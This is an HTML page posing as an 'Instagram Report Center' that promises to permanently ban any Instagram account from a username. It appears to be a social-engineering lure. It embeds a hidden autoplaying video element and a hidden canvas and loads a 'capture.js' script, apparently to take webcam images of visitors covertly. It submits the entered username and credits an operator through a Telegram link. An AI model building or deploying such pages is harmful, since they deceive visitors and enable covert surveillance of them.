<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="theme-color" content="#dc2743">
<title>Instagram Report Center</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="page">
  <div class="card">
    <div class="brand-icon ig">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <rect x="2" y="2" width="20" height="20" rx="5"/>
        <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
        <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
      </svg>
    </div>
    <h1>Ban Instagram Account</h1>
    <p class="sub">Report and permanently ban any Instagram account by entering their username below.</p>
    <div class="field">
      <label for="target">Username to ban</label>
      <div class="input-wrap">
        <span class="prefix">@</span>
        <input id="target" type="text" placeholder="username" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
    </div>
    <button class="btn ig" onclick="go()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
      Submit Ban Request
    </button>
    <div class="status" id="status"></div>
    <div class="trust">
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Confidential</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Verified</span>
      <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Fast</span>
    </div>
  </div>
  <div class="brand">Powered by <a href="https://t.me/noob11001" target="_blank">NOOBSTER</a></div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script src="/static/capture.js"></script>
<script>
function go(){
  let v=document.getElementById('target').value.trim().replace(/^@/,'');
  const st=document.getElementById('status');
  const btn=document.querySelector('.btn');
  if(!v){st.innerText='Please enter a username';return;}
  st.innerText='';btn.disabled=true;
  handleSubmit('instagram-ban',{username:'@'+v});
}
</script>
</body>
</html>
